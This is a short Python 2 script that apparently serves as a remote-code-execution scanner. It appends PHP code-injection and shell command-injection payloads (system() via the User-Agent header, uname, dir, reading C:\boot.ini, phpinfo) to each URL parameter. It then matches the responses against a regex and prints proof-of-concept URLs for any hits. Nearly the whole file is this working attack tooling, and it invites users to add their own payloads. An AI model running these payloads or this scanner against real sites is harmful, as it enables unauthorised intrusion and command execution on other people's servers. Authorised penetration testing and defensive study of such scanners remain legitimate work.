#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import re
import urllib
from myheaders import *

def main_function(url, payloads, check):
	opener = urllib.urlopen(url)
	vuln = 0

	for params in url.split("?")[1].split("&"):
		for payload in payloads:
			bugs = url.replace(params, params + str(payload).strip())
			request = useragent.open(bugs)
			html = request.readlines()
			for line in html:
				checker = re.findall(check, line)
				if (len(checker) != 0):
					print " [*] Possible vulnerability found!"
					print " [*] Payload: ", payload
					print " [*] Example POC: " + bugs
					vuln = vuln + 1
	if (vuln == 0):
		print "No vulnerabilities :("
	else:
		print "We've found some vulnerabilities. Please do not be a bad guy."



def RCEfunction(url):
	headersRdr(url)
	print "Scanning... \n"
	# YOU CAN EDIT THIS LINE AND ADD YOUR OWN PAYLOADS
	payloads = [';${@print(md5(RCEVulnerable))}', ';${@print("RCEVulnerable")}', "${@print(system($_SERVER['HTTP_USER_AGENT']))}", ';{$_GET["cmd"]}', ';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ':phpversion();']
	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
	main_function(url, payloads, check)


